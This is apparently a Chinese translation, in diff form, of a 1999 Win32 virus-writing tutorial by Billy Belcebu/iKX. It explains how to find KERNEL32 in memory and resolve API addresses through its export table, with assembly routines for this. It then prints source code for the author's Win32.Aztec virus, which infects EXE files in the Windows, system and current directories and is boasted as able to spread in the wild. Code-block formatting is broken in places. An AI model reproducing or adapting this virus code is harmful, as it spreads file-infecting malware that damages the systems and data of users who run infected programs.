+正如我在介绍那一章所介绍的，`Ring-3` 是用户级的，所以我们只能访问它的有限的权限。例如，我们不能使用端口，读或写某些的内存区域，等等。当开发 `Win95`(那些再也没有人说的"Win32 平台是不可感染"的系统)的时候，微软如果压制住过去所编写的病毒，微软就确信能够击败我们。在他们的美梦中，他们认为我们不能使用他们的 `API` 函数，而且，他们更没想到我们能跳转到 `Ring-0`，但是，这是另外一段历史了。
+
+正如你以前所说的，我们以 `API` 函数名作为外部函数，所以 `import32.lib` 给了我们函数的地址，而且它已经汇编了，但是我们在写病毒的时候有一个问题。如果我们 `hardcode`(也就是说我们调用一个 `API` 函数的时候给的是一个固定的偏移地址)，最可能发生的事情是在下一个版本的 `Win32` 版本中，那个地址再也不起作用了。你可以看看 `Bizatch` 中的一个例子。我们该怎么做呢？好了，我们有一个函数叫做 `GetProcAddress`,它返回给我们的是我们所需要的 `API` 的地址。聪明的你可能已经注意到了 `GetProcAddress` 也是一个 `API`，所以如果我们没有得到那个 `API` 还谈什么利用它来搜索其它 `API` 呢。正如在生活中我们所遇到的事情一样，我们有许多可能性的东西去做，而且我将提及我认为最好的两种方法：
+
+1. 在输入表中搜索 `GetProcAddress` `API` 函数。
+2. 当我们感染一个文件的时候，在它的输入函数里寻找 `GetProcAddress`。
+
+因为最早的方法是第一个，猜猜现在我将会解释哪一个呢？:)OK,让我们以理论学习开始，在这之后，一些代码。
+
+如果你看看 `PE` 头的格式，我们在偏移地址 `78h`(是 `PE` 头，不是文件!)得到输入表。好了，我们需要利用内核的输出地址。在 `Window 95/98` 下，内核通常在偏移地址 `0BFF70000h` 处，而 `Window NT` 的内核看起来是在 `077F00000h` 处。在 `Win2K` 中我们在偏移地址 `077E00000h` 处得到它。所以，首先，我们把它的地址保存到寄存器中，我们将用来作为指针。我强烈建议使用 `ESI`，主要是因为我们可以通过使用 `LODSD` 来优化一些东西。好了，我们检查在这个地址处是不是`MZ`(恩反过来为`ZM`，该死的 `intel` 处理器架构)，因为内核是一个库(`.DLL`)，而库有一个 `PE` 头，正如我们以前看 `PE` 头的时候，是 `DOS`-兼容的一部分的时候所看到的。在那个比较之后，让我们检查它是不是 `PE`，所以我们到头的偏移 `image_base+[3Ch]` (=内核的偏移地址＋内核的 `PE` 头的 `3Ch` 偏移)，搜索比较`PE\0\0`,`PE` 文件的签名。
+
+如果所有都正确，那么让我们继续。我们需要输出表的 `RVA`，正如你所能看到的，它在 `PE` 头的偏移地址 `78h` 处。所以我们得到了它。但是，正如你所知道的，`RVA`(`Relative Virtual Address`)，正如它的名字所表明的，是和一个 `OFFSET` 的相对值，在这种 `image base` 为 `kernel` 的情况下，正如我以前所说的，那就是它的地址。就这么简单：仅仅把 `kernel` 的偏移加上在输出表(`Export Table`)中的 `RVA` 即可。好了，我们现在已经在输出表中了:)
+
+让我们看看它的格式：
+
+```
+ ---------------------------------- <----+00000000h
+|            Export Flags             |      Size : 1 DWORD
+|----------------------------------|<----+00000004h
+|          Time/Date stamp           |      Size : 1 WORD
+|----------------------------------|<----+00000006h
+|            Major version           |       Size : 1 WORD
+|----------------------------------|<----+00000008h
+|            Minor version          |      Size : 1 DWORD
+|----------------------------------|<----+0000000Ch
+|              Name RVA             |      Size : 1 DWORD
+|----------------------------------|<----+00000010h
+|    Number Of Exported Functions    |      Size : 1 DWORD
+|----------------------------------|<----+00000014h
+|     Number Of Exported Names       |      Size : 1 DWORD
+|----------------------------------|<----+00000018h
+|      Export Address Table RVA      |      Size : 1 DWORD
+|----------------------------------|<----+0000001Ch
+|   Export Name Pointers Table RVA   |      Size : 1 DWORD
+|----------------------------------|<----+00000020h
+|       Export Ordinals RVA          |      Size : 1 DWORD
+|____________________________________|
+                         Total Size : 24h BYTES
+```
+
+对我们来说是最后 6 个域。在地址表 `RVA` 的值中，正如你能想象的是，`Name Pointers RVA` 和 `Ordinals RVA` 都是和 `KERNEL32` 的基址相关的。所以，获得 `API` 地址的第一步是知道这个 `API` 的位置，而知道它的最简单的方法是到 `Name Pointers` 所指示的偏移地址处去寻找，把它和我们想要找的 `API` 做比较，如果它们完全相同，我们就要计算 `API` 的偏移地址了。好了，我们已经到了这一步了，而且我们在计数器中有一个值，因为我们没检查一次 `API` 的名字就加一次。这个计数器，正如你能想象的，将会保存我们已经找到的 `API` 名字的个数，而且它们不相等。这个计数器可以是一个字或一个双字，但是最好不要是一个字节，因为我们需要超过 255 个 `API` 函数:)
+
+说明：我假设你把地址的 `VA`(`RVA+kernel image base`), `Name` 和 (序数表)`Ordinal tables` 已经保存到相关的变量中了。
+
+OK，假设我们已经获得了我们想要得到的 `API` 的名字，所以，我们得到了它在名字指针表中的计数。接下来可能对你来说是最复杂的，开始 `Win32` 编码。嗯，让我们继续下去。我们得到了计数，而且我们现在要在 `Ordinal Table`(一个 `dword` 数组)中搜索我们想要得到的 `API` 的序数。当我们得到了 `API` 在数组(在计数器)中的数字，我们仅仅把它乘以 2(记住，序数数组是由字组成的，所以，我们必须对字进行计算...)，而且当然了，把它加上序数表的开始偏移地址。为了继续我已经解释的东西，我们需要由下面公式指向的字：
+
+`API's Ordinal location: ( counter * 2 ) + Ordinal Table VA`
+
+很简单，是不是啊？下一步(而且是最后一步)是从地址表中获得 `API` 的确定地址。我们已经得到了 `API` 的序号，对吗？利用它，我们的生活变得非常容易。我们只有把序号乘以 4(因为地址数组是双字形式的而不是字，而一个双字的大小是 4)，而且把它加上先前得到的地址表开始的偏移地址。呵呵，现在，我们得到了 `API` 地址的 `RVA` 啦。所以我们要把它规范化，加上 `Kernel` 的偏移地址，那样就好了。我们得到了它!!!让我们看看这个的数学公式：
+
+`API's Address: ( API's Ordinal * 4 ) + Address Table VA + KERNEL32 imagebase`
+----------------------------------------------------- So, as we retrieve  the position
+
+
+
+这些表还有更多的入口，但是有那些就足够了...
+
+我希望你已经理解了我解释的东西。我试图尽可能的使它表述简单，如果你不能理解它，不要往下看了，一步一步地重读它。要有耐心。我肯定你会懂地。嗯，现在你可能需要一些代码了。下面给出我例程，作为一个示例，在我的 `Iced Earth` 病毒中用到了。
+
+#### `GetAPI` & `GetAPIs` 过程
+
+这是我的寻找所有需要的 API 的函数... 它们被分成了两部分。`GetAPI` 函数仅仅获得了我们需要的一个函数, 而 `GetAPIs` 函数则搜索病毒所需要的所有 API 函数。
+
+```asm
+GetAPI proc
+;--------------------------------------------------------------------------
+; 让我们来看看，这个函数需要和返回的参数如下：
+;
+; 输入：   ESI : 指向 API 名字的指针 (区分大小写)
+; 输出：   EAX : API 地址
+;--------------------------------------------------------------------------
+    mov     edx,esi                 ; Save ptr to name
+@_1:  cmp     byte ptr [esi],0        ; Null-terminated char?
+    jz      @_2                     ; Yeah, we got it.
+    inc     esi                     ; Nopes, continue searching
+    jmp     @_1                     ; bloooopz...
+@_2:  inc     esi                     ; heh, don't forget this ;)
+    sub     esi,edx                 ; ESI = API Name size
+    mov     ecx,esi                 ; ECX = ESI :)
+;--------------------------------------------------------------------------
+; 好了，我亲爱的朋友们，这很容易理解。我们在 ESI 中是指向 API 名字开始
+; 的指针，让我们想象一下，我们想要寻找"FindFirstFileA":
+;
+; FFFA         db   "FindFirstFileA",0
+;               ↑ 指针指向这儿
+;
+; 而且我们需要保存这个指针，并知道了 API 名的大小，所以
+; 我们把指向 API 名字的初始指针保存到一个我们不用的寄存器中如 EDX
+; 然后增加在 ESI 中的指针的值，直到[ESI]=0
+;
+; FFFA         db   "FindFirstFileA",0
+;                               ↑ 现在指针指向这儿了
+;
+; 也就是说，以 NULL 结尾:)然后，通过把新指针减去旧指针，我们得
+; 到了 API 名字的大小，搜索引擎需要它。然后我把它保存到 ECX 中，
+; 也是一个我们不会使用的寄存器。
+;---------------------------------------------------------------------------
+    xor     eax,eax                 ; EAX = 0
+    mov     word ptr [ebp+Counter],ax ; Counter set to 0
+    mov     esi,[ebp+kernel]        ; Get kernel's PE head. offset
+    add     esi,3Ch
+    lodsw                           ; in AX
+    add     eax,[ebp+kernel]        ; Normalize it
+    mov     esi,[eax+78h]           ; Get Export Table RVA
+    add     esi,[ebp+kernel]        ; Ptr to Address Table RVA
+    add     esi,1Ch
+;---------------------------------------------------------------------------
+; 首先，我们清除 EAX，然后为了避免无法预料的错误，使得计数变量为 0。
+; 如果你还记得 PE 文件头偏移地址 3CH(从映象基址 MZ 标志开始计数)的作用，
+; 你会理解这个的。我们正在请求得到 KERNEL32 PE 头偏移的开始。因为
+; 它是一个 RVA，我们把它规范化，那就是我们得到了它的 PE 头偏移地址。
+; 现在我们所要做的是获得输出表(Export Table)的地址(在 PE 头+78h 处)，
+; 然后，我们避开这个结构的不想要的数据，直接获得地址表(Address Table)
+; 的 RVA。
+;---------------------------------------------------------------------------
+    lodsd                           ; EAX = Address Table RVA
+    add     eax,[ebp+kernel]        ; Normalize
+    mov     dword ptr [ebp+AddressTableVA],eax ; Store it in VA form
+    lodsd                           ; EAX = Name Ptrz Table RVA
+    add     eax,[ebp+kernel]        ; Normalize
+    push    eax                     ; mov [ebp+NameTableVA],eax
+    lodsd                           ; EAX = Ordinal Table RVA
+    add     eax,[ebp+kernel]        ; Normalize
+    mov     dword ptr [ebp+OrdinalTableVA],eax ; Store in VA form
+    pop     esi                     ; ESI = Name Ptrz Table VA
+;---------------------------------------------------------------------------
+; 如果你还记得，在 ESI 中是指向地址表 RVA(Address Table RVA)的指针，所以，
+; 我们为了得到那个地址，用了一个 LODSD，它把由 ESI 所指定的双字(DWORD)保
+; 存到 EAX 中。因为它是一个 RVA，我们需要对它规范化。
+;
+; 让我们看看 Matt Pietrek 关于这个第一个域的描述：
+;
+; “这个域是一个 RVA 而且指向一个函数地址数组。这个函数地址是这个模块中
+; 每一个输出地址的入口点(RVA)。”
+;
+; 毫无疑问了，我们把它保存到它的变量中了。然后，接下来我们找到的
+; 是名字指针表(Name Pointers Table)，Matt Pietrek 的描述如下：
+;
+; “这个域是一个 RVA，而且指向一个字符串指针数组。这些字符串是模块
+; 的输出函数的名字。”
+;
+; 但是我没有把它保存到一个变量中，我把它压栈，仅仅是因为我很快就要用到
+; 它。最终，我们找到了，下面是 Matt Pietrek 关于它的描述：
+;
+; “这个域是一个 RVA，而且指向一个字(WORD)数组。这些字是这个模块
+; 的所有输出函数的序号”。
+;
+; 好了，那就是我们所做的事情。
+;---------------------------------------------------------------------------
+@_3:  push    esi                     ; Save ESI for l8r restore
+    lodsd                           ; Get value ptr ESI in EAX
+    add     eax,[ebp+kernel]        ; Normalize
+    mov     esi,eax                 ; ESI = VA of API name
+    mov     edi,edx                 ; EDI = ptr to wanted API
+    push    ecx                     ; ECX = API size
+    cld                             ; Clear direction flag
+    rep     cmpsb                   ; Compare both API names
+    pop     ecx                     ; Restore ECX
+    jz      @_4                     ; Jump if APIs are 100% equal
+    pop     esi                     ; Restore ESI
+    add     esi,4                   ; And get next value of array
+    inc     word ptr [ebp+Counter]   ; Increase counter
+    jmp     @_3                     ; Loop again
+;---------------------------------------------------------------------------
+; 嗨，是不是我放了太多的代码而没有注释？因为我刚做好，但是懂得了这一块代码
+; 不能因为解释它而分离开来。我们首先所做的是把 ESI(在 CMPSB 指令执行中将改变)
+; 压栈，以备后用。然后，我们获得由 ESI(Name Pointerz Table)指向的双字保存到
+; 累加器(EAX)中，所有这些通过 LODSD 指令实现。我们通过加上 kernel 的基址来规范
+; 化它。好了，现在我们在 EAX 中是指向某一个 API 名字的指针，但是我们不知道(仍然)
+; 是什么 API。例如，EAX 可以指向诸如"CreateProcessA"，而这个 API 对我们的病毒来
+; 说不感兴趣...为了把那个字符串和我们想要的字符串(现在由 EDX 指向)，我们有 CMPSB。
+; 所以，我们准备它的参数:在 ESI 中，我们使得指针指向现在在 Name Pointerz Table 中
+; 的 API 的开始，在 EDI 中，我们使之指向需要的 API)。在 ECX 中我们保存它的大小，
+; 然后我们按字节比较。如果所有的字符相等，就设置 0 标志，然后跳转到获取那个 API
+; 地址的例程，但是如果它失败了，我们恢复 ESI，并把它加上 DWORD 的大小，为了获取
+```
+
+
+
+; 在 `Name Pointerz Table` 数组中的下一个值。我们增加计数器的值(非常重要)，然后  
+; 继续搜索。  
+;---------------------------------------------------------------------------  
+`@_4:`  
+```asm
+    pop     esi                 ; Avoid shit in stack
+    movzx   eax,word ptr [ebp+Counter]      ; Get in AX the counter
+    shl     eax,1               ; EAX = AX * 2
+    add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
+    xor     esi,esi             ; Clear ESI
+    xchg    eax,esi             ; EAX = 0, ESI = ptr to Ord
+    lodsw                 ; Get Ordinal in AX
+    shl     eax,2               ; EAX = AX * 4
+    add     eax,dword ptr [ebp+AddressTableVA] ; Normalize
+    mov     esi,eax             ; ESI = ptr to Address RVA
+    lodsd                 ; EAX = Address RVA
+    add     eax,[ebp+kernel]      ; Normalize and all is done.
+    ret
+```
+;---------------------------------------------------------------------------  
+; Pfff, 又一个巨大的代码块，而且看起来很难理解，对吗?呵呵，不要害怕，我将要  
+; 注释它:)  
+; 呃，`pop` 指令是为了清除堆栈，我们把计数值(因为它是一个 `WORD`)放置到 `EAX` 的低位  
+; 中，并把这个寄存器的高位清 0。我们把它乘以 2，因为我们只得到了它的数字，  
+; 而且我们要搜索的数组是一个 `WORD` 数组。现在把它加上指向我们要搜索的数组开始的  
+; 指针，而在 `EAX` 中是我们想要的 `API` 的指针的序号。所以我们把 `EAX` 保存到 `ESI` 中为了使  
+; 用那个指针来获取它指向的值，也就是说，序号保存到 `EAX` 中，用简单的 `LODSW`。  
+; 嗨，我们得到了序号，但是我们想要的是 `API` 代码的入口(`EntryPoint`)，所以，我们  
+; 把序数(保存了想要的 `API` 在地址表中的入口点位置)乘上 4，也就是说 `DWORD` 的大小，  
+; 然后我们得到了一个 `RVA` 值，和 `Address Table RVA` 相关，所以我们规范化，那么现在  
+; 我们在 `EAX` 中得到的是指向地址表中的 `API` 的入口点的指针。我们把 `EAX` 赋给 `ESI`，在 `EAX`  
+; 中得到了指向的值。这样我们在 `EAX` 中得到了需要的 `API` 的入口 `RVA` 的值。嗨,现在我们  
+; 必须要做的是把那个地址和 `KERNEL32` 的基址规范化，瞧，做好了，我们在 `EAX` 中  
+; 得到了 `API` 的真正地址!!!;)  
+;---------------------------------------------------------------------------  
+`GetAPI` `endp`  
+;---------------------------------------------------------------------------  
+;---------------------------------------------------------------------------  
+`GetAPIs` `proc`  
+;---------------------------------------------------------------------------  
+; Ok, 这是通过使用以前的函数来获得所有 `API` 的代码，它的参数为:  
+;  
+; 输入: `ESI` : 指向想要得到的第一个 `API` 名字 `ASCII` 码的首地址  
+; `EDI` : 指向将要保存的想要得到第一个 `API` 的变量  
+; 输出: 无。  
+;  
+; 好了，我假设你想要获得的所有值的结构如下：  
+;  
+; `ESI` 指向 → `db "FindFirstFileA",0`  
+; `db "FindNextFileA",0`  
+; `db "CloseHandle",0`  
+; `[...]`  
+; `db 0BBh ; 标志着这个数组的结束`  
+;  
+; `EDI` 指向 → `dd 00000000h ; FFFA 的将来的地址`  
+; `dd 00000000h ; FNFA 的将来的地址`  
+; `dd 00000000h ; CH 的将来的地址`  
+; `[...]`  
+;  
+; 我希望你足够聪明，能理解它。  
+;---------------------------------------------------------------------------  
+`@@1:`  
+```asm
+    push    esi
+    push    edi
+    call    GetAPI
+    pop     edi
+    pop     esi
+    stosd
+```
+;---------------------------------------------------------------------------  
+; 我们把在这个函数中处理的值压栈为了避免它们改变，并调用 `GetAPI` 函数。  
+; 我们假设现在 `ESI` 是一个指向想要的 `API` 名字的指针，`EDI` 是指向要处理 `API` 名字的变量  
+; 的指针。因为函数在 `EAX` 中返回给我们 `API` 的偏移地址，我们通过使用 `STOSD` 把它保存到  
+; 由 `EDI` 指向的相关变量中。  
+;---------------------------------------------------------------------------  
+`@@2:`  
+```asm
+    cmp     byte ptr [esi],0
+    jz      @@3
+    inc     esi
+    jmp     @@2
+```
+`@@3:`  
+```asm
+    cmp     byte ptr [esi+1],0BBh
+    jz      @@4
+    inc     esi
+    jmp     @@1
+```
+`@@4:`  
+```asm
+    ret
+```
+`GetAPIs` `endp`  
+;---------------------------------------------------------------------------  
+; 可以更优化，我知道，但是，为了更好为我的解释服务。我们首先所做的是到达我们  
+; 以前请求的地址的字符串的尾部，现在它指向下一个 `API`。但是我们想要知道它是否  
+; 是最后一个 `API`，所以我们检查我们的标志，字节 `0BBh`(猜猜为什么是 `0BBh?`)。如果它  
+; 是，我们就已经得到了所有需要的 `API`，而如果不是，我们继续我们的搜索。  
+;---------------------------------------------------------------------------  
+;------到这儿为止剪切-------------------------------------------------------  
+
+呵呵，我尽可能的使得这些过程简单，而且我注释了很多，你将会不通过复制就可以理解了。而且如果你  
+你复制也不是我的问题...呵呵，我没有不允许你复制它:)但是，现在的问题是我们该搜索什么 `API` 呢?这主要依赖于在进行 `PE` 操作之前方式。我将给你演示一个直接行为(即运行期)版本的一个病毒，它使用了文件映射计数(更容易操作和更快地感染)，我将会列出你能使用地 `API` 函数。
+
+### 一个病毒示例
+
+~~~
+不要认为我疯了，我将在这里放一个病毒的代码仅仅是为了避免烦人的解释所有 `API` 的东西，而且还可以看看它们的作用:)好了，下面你得到的是我的最近的创造。我花了一个下午来完成它：我把它基于 `Win95.Iced Earth`，但是没有 `bug` 和特殊功能。享受这个 `Win32.Aztec`!(Yeah, Win32!!!)。
+
+;----从这儿开始剪切-----------------------------------------------------------
+
+; [Win32.Aztec v1.01] - Iced Earth 的 Bug 修复版本
+; Copyright (c) 1999 by Billy Belcebu/iKX
+;
+; 病毒名    : Aztec v1.01
+; 病毒作者  : Billy Belcebu/iKX
+; 国籍      : Spain(西班牙)
+; 平台      : Win32
+; 目标      : PE 文件
+; 编译      : TASM 5.0 和 TLINK 5.0 用
+;                 tasm32 /ml /m3 aztec,,;
+;                 tlink32 /Tpe /aa /c /v aztec,aztec,,import32.lib,
+;                 pewrsec aztec.exe
+; 说明      : 现在所有东西都是特别的了。只是 Iced Earth 病毒的 bug 修复，并移除了一些特殊功能
+;             这是一个学习 Win32 病毒的真正病毒。
+; 为什么'Aztec'?  : 为什么叫这个名字呢?许多原因:
+;                 ?如果有一个 Inca 病毒和一个 Maya 病毒... ;)
+;                 ?我在 Mexico 生活过 6 个月
+;                 ?I hate the fascist way that Hernan Cortes used for steal
+;                   their territory to the Aztecs
+;                 ?I like the kind of mithology they had ;)
+;                 ?我的声卡是一个 Aztec 的 :)
+;                 ?我爱 Salma Hayek! :)~
+;                 ?KidChaos 是我的一个朋友 :)
+; 问候      : 这次只向所有在 EZLN 和 MRTA 的人问候。
+;                 祝所有人好运，和... 继续战斗!
+;
+; (c) 1999 Billy Belcebu/iKX
+
+    .386p                   ; 需要 386+  =)
+    .model  flat             ; 32 位寄存器, 没有段.
+    jumps                   ; 为了避免跳出范围
+extrn   MessageBoxA:PROC                    ; 第一次产生的时候输入的 API 函数:) 
+extrn   ExitProcess:PROC                  ; 
+
+; 病毒的一些有用的 equ
+virus_size      equ     (offset virus_end-offset virus_start)
+heap_size       equ     (offset heap_end-offset heap_start)
+total_size      equ     virus_size+heap_size
+shit_size       equ     (offset delta-offset aztec)
+
+; 仅仅是为第一次产生的时候编码的, 不要担心 ;)
+kernel_         equ     0BFF70000h
+kernel_wNT      equ     077F00000h
+
+    .data
+szTitle         db      "[Win32.Aztec v1.01]",0
+szMessage       db      "Aztec is a bugfixed version of my Iced Earth",10
+                db      "virus, with some optimizations and with some",10
+                db      "'special' features removed. Anyway, it will",10
+                db      "be able to spread in the wild succefully :)",10,10
+                db      "(c) 1999 by Billy Belcebu/iKX",0
+
+ ;---------------------------------------------------------------------------
+ ; 所有这些都是狗屎：有一些宏可以使得这些代码更好看，而且有一些是为
+ ; 第一次产生时用的，等等。
+ ;---------------------------------------------------------------------------
+
+    .code
+virus_start     label   byte
+aztec:
+    pushad                        ; Push 所有寄存器
+    pushfd                        ; Push FLAG 寄存器
+    call    delta                 ; 最难理解的代码 ;)
+delta:  pop     ebp
+    mov     eax,ebp
+    sub     ebp,offset delta
+    sub     eax,shit_size           ; Obtain the Image Base on 
+    sub     eax,00001000h           ; the fly
+NewEIP  equ     $-4
+    mov     dword ptr [ebp+ModBase],eax
+
+ ;---------------------------------------------------------------------------
+~~~
+
+
+
+; Ok. 首先，我把所有的寄存器和所有的标志都压栈了(不是因为需要这么做，仅仅是
+
+; 因为我一直喜欢这么做)。然后，我所做的都是非常重要的。是的!它是 `delta offset`!
+
+; 我们必须得到它因为原因你必须知道：我们不知道我们是在内存的哪里执行代码，所
+
+; 以通过这个我们就能很容易地知道它...我不会告诉你更多关于 `delta offset` 的东西了，
+
+; 因为我肯定你已经从 DOS 编码知道了;)接下来是获得当前进程的基址(`Image Base`),
+
+; 这需要返回控制权给主体(将会在以后做)。首先我们减去在 `delta` 标志和 `aztec` 标志
+
+; (7 bytes->`PUSHAD` (1)+`PUSHFD` (1)+`CALL` (5))的字节，然后我们减去当前的 `EIP`
+
+; (在感染的时候补丁)，也就是说我们得到了当前的基址(`Image Base`)。
+
+;---------------------------------------------------------------------------
+
+```
+        mov     esi,[esp+24h]                   ; 获得程序返回地址
+        and     esi,0FFFF0000h                  ; 和 10 页对其
+        mov     ecx,5                           ; 50 页 (10 组)
+        call    GetK32                          ; 调用它
+        mov     dword ptr [ebp+kernel],eax      ; EAX 必须是 K32 的基址
+```
+
+;---------------------------------------------------------------------------
+
+; 首先，我们从调用的进程(它在，可能为 `CreateProcess` API 函数)中得到的地址放到
+
+; `ESI` 中，它最初是由 `ESP` 所指向的地址，但是当我们使用堆栈压了 24 个字节(20 被 `PUSHAD`,
+
+; 其它的为 `PUSHFD`)，我们不得不修正它。然后我们使它按 10 页对齐，使 `ESI` 的低位为 0。
+
+; 在这之后，我们设置 `GetK32` 函数的其它参数，`ECX`，保存着要搜索的 10 页的最大组数，
+
+; 为 5(也就是说 5*10=50 页)，然后我们调用函数。当它返回给我们正确的 `KERNEL32` 的
+
+; 基址之后，我们把它保存起来。
+
+;---------------------------------------------------------------------------
+
+```
+        lea     edi,[ebp+@@Offsetz]
+        lea     esi,[ebp+@@Namez]
+        call    GetAPIs                         ; 找到所有的 API
+        call    PrepareInfection
+        call    InfectItAll
+```
+
+;---------------------------------------------------------------------------
+
+; 首先，我们设置 `GetAPIs` 函数的参数，就是在 `EDI` 中是一个指针，这个指针指向将要
+
+; 保存 API 地址的 DWORD 数组，在 `ESI` 是所有要搜索的 API 函数的 ASCII 名字。
+
+;---------------------------------------------------------------------------
+
+```
+        xchg    ebp,ecx                         ; 是不是第一次产生?
+        jecxz   fakehost
+        popfd                                     ; 恢复所有的标志
+        popad                                     ; 恢复所有的寄存器
+        mov     eax,12345678h
+        org     $-4
+OldEIP  dd      00001000h
+        add     eax,12345678h
+        org     $-4
+ModBase dd      00400000h
+        jmp     eax
+```
+
+;---------------------------------------------------------------------------
+
+; 首先，我们看看我们是不是在第一次产生病毒，通过检测 `EBP` 的值是否为 0。如果是，
+
+; 我们跳转到第一次产生的地方。但是，如果它不是，我们先从堆栈中恢复标志寄存器，
+
+; 接下来是所有的寄存器。然后我们的指令是给 `EAX` 赋感染后的程序旧入口地址(在感染
+
+; 的时候补丁)，然后我们把它加上当前进程(在运行期补丁)的基址，我跳到它那里。
+
+;---------------------------------------------------------------------------
+
+`PrepareInfection`:
+
+```
+        lea     edi,[ebp+WindowsDir]            ; 指向第一个目录
+        push    7Fh                             ; 把缓存的大小压栈
+        push    edi                             ; 把缓存的地址压栈
+        call    [ebp+_GetWindowsDirectoryA]     ; 获取 windows 目录
+        add     edi,7Fh                         ; 指向第二个目录
+        push    7Fh                             ; 把缓存的大小压栈
+        push    edi                             ; 把缓存的地址压栈
+        call    [ebp+_GetSystemDirectoryA]      ; 获取 windows\system 目录
+        add     edi,7Fh                         ; 指向第三个目录
+        push    edi                             ; 把缓存的地址压栈
+        push    7Fh                             ; 把缓存的大小压栈
+        call    [ebp+_GetCurrentDirectoryA]     ; 获取当前目录
+        ret
+```
+
+;---------------------------------------------------------------------------
+
+; 这是一个简单的用来获取病毒将要搜索文件来感染的所有目录，并按这个特定顺序。
+
+; 因为一个目录的最大长度是 7F 字节，我已经保存到堆栈(看下面)的三连续变量中，
+
+; 因此避免无用的代码占更多的字节，和随病毒传播无用的数据。请注意在最后一个
+
+; API 中没有任何错误，因为在那个 API 中，顺序改变了。让我们对那个 API 做一个更
+
+; 深的分析：
+
+;
+
+; `GetWindowsDirectory` 函数得到 Windows 的目录。Windows 目录包含了一些基于 Windows
+
+; 的应用程序，初始化文件，和帮助文件。
+
+;
+
+```
+UINT GetWindowsDirectory(
+  LPTSTR lpBuffer,    // 保存 Windows 目录的缓存地址
+  UINT uSize          // 目录缓存的大小
+);
+```
+
+; 参数
+
+; ====
+
+; * `lpBuffer`: 指向接受 NULL 结尾的包含路径的字符串的缓存。这个路径不是以一个
+
+;   反斜线符号结束的，除非 Windows 目录是根目录。例如，如果 Windows 目录是在 C
+
+;   盘上的以 `WINDOWS` 命名的，那么这个函数返回的 Windows 目录是 `C:\WINDOWS`。如果
+
+;   Windows 是安装在 C 盘的根目录上的，返回的路径是 `C:\`。
+
+; * `uSize`: 指定被 `lpBuffer` 参数指向的缓存的字符最大个数。这个值应该设置成至少
+
+;   为 `MAX_PATH` 来为路径指定足够的空间。
+
+;
+
+; 返回值
+
+; =====
+
+;
+
+; * 如果函数成功执行了，返回值是复制到缓冲区的字符个数，不包括 NULL 结尾符。
+
+; * 如果长度比缓冲区的大小还要大，返回值将是缓冲区所需要保存路径所需要的
+
+;   大小。
+
+;
+
+; ---
+
+;
+
+; `GetSystemDirectory` 函数得到的是 Windows 系统目录，系统目录包括诸如 Windows 库
+
+; 驱动和字体文件。
+
+;
+
+```
+UINT GetSystemDirectory(
+  LPTSTR lpBuffer,    // 保存系统目录的缓冲区
+  UINT uSize          // 目录缓冲区的大小
+);
+```
+
+;
+
+; 参数
+
+; ====
+
+;
+
+; * `lpBuffer`: 指向接受以 NULL 结尾的包含路径的字符串的缓冲区。这个路径不是以一个
+
+;   反斜线符号结尾的，除非系统目录是根目录。例如，如果系统目录是在 C 盘上的名为
+
+;   `WINDOWS\SYSTEM`，那么这个函数返回的系统目录路径为 `C:\WINDOWS\SYSTEM`。
+
+;
+
+; * `uSize`: 指定缓冲区的最大字符个数。这个值应该被设置成最小 `MAX_PATH`。
+
+;
+
+; 返回值
+
+; =====
+
+;
+
+; * 如果函数成功了，返回值是复制到缓冲区中的字符个数，不包括 NULL 结尾字符。
+
+;   如果长度大于缓冲区的大小，返回值是保存路径的缓冲区所需要的大小。
+
+;
+
+; ---
+
+;
+
+; `GetCurrentDirectory` 函数得到的是当前进程的当前目录。
+
+;
+
+```
+DWORD GetCurrentDirectory(
+  DWORD nBufferLength,        // 目录缓冲区的字符个数
+  LPTSTR lpBuffer            // 保存当前目录的缓冲区地址
+);
+```
+
+; 参数
+
+; ====
+
+;
+
+; * `nBufferLength`: 保存当前目录字符串的缓冲区的字符个数。缓冲区的长度必须包括
+
+;   NULL 字符在内。
+
+;
+
+; * `lpBuffer`: 指向保存当前目录字符串缓冲区的字符串。这个以 NULL 结尾的字符串保存
+
+;   的是当前目录的绝对路径。
+
+;
+
+; 返回值
+
+; =====
+
+;
+
+; * 如果函数成功执行了，返回的值是写到缓冲区的字符个数，不包括 NULL 字符。
+
+;---------------------------------------------------------------------------
+
+`InfectItAll`:
+
+```
+        lea     edi,[ebp+directories]           ; 指向第一个目录
+        mov     byte ptr [ebp+mirrormirror],03h ; 3 个目录
+requiem:
+        push    edi                             ; 设置由 EDI 指向的目录
+        call    [ebp+_SetCurrentDirectoryA]
+        push    edi                             ; 保存 EDI
+        call    Infect                          ; 感染选定的目录的所有文件
+        pop     edi                             ; 恢复 EDI
+        add     edi,7Fh                         ; 另外一个目录
+        dec     byte ptr [ebp+mirrormirror]     ; 计数器－1
+        jnz     requiem                         ; 是最后一个吗？不是，再来
+        ret
+```
+
+;---------------------------------------------------------------------------
+
+; 我们开始所做的是使 `EDI` 指向数组中的第一个目录，然后我们设置我们想要感染的目录
+
+; 个数(`dirs2inf=3`)。好了，然后我们开始主循环。它包括如下:我们改变目录到当前
+
+; 选定的目录下面，我们感染所有那个目录的所有想要感染的文件，然后我们得到了另外
+
+; 一个目录知道我们完成了我们想要感染的 3 个目录。简单，啊？:)该看看 `SetCurrentDirectory`
+
+; 这个 API 函数的特征了:
+
+;
+
+; `SetCurrentDirectory` 为当前进程改变当前目录。
+
+;
+
+```
+BOOL SetCurrentDirectory(
+  LPCTSTR lpPathName          // 当前新目录的名字地址
+);
+```
+
+;
+
+; 参数
+
+; ====
+
+;
+
+; * `lpPathName`: 指向一个以 NULL 字符结尾的字符串，这个字符串保存当前新目录的
+
+;   名字。这个参数可以是一个相对路径，还可以是绝对路径。在每种情况下，都是
+
+;   计算并保存的当前目录的绝对路径。
+
+;
+
+; 返回值
+
+; =====
+
+;
+
+
+
+; ?如果函数成功执行，返回的是非 0 值。
+
+;---------------------------------------------------------------------------
+
+```
+Infect: and dword ptr [ebp+infections],00000000h ; reset countah
+    lea eax,[ebp+offset WIN32_FIND_DATA] ; Find's shit structure
+    push eax ; Push it
+    lea eax,[ebp+offset EXE_MASK] ; Mask to search for
+    push eax ; Push it
+    call [ebp+_FindFirstFileA] ; Get first matching file
+    inc eax ; CMP EAX,0FFFFFFFFh
+    jz FailInfect ; JZ FAILINFECT
+    dec eax
+    mov dword ptr [ebp+SearchHandle],eax ; Save the Search Handle
+```
+
+;---------------------------------------------------------------------------
+
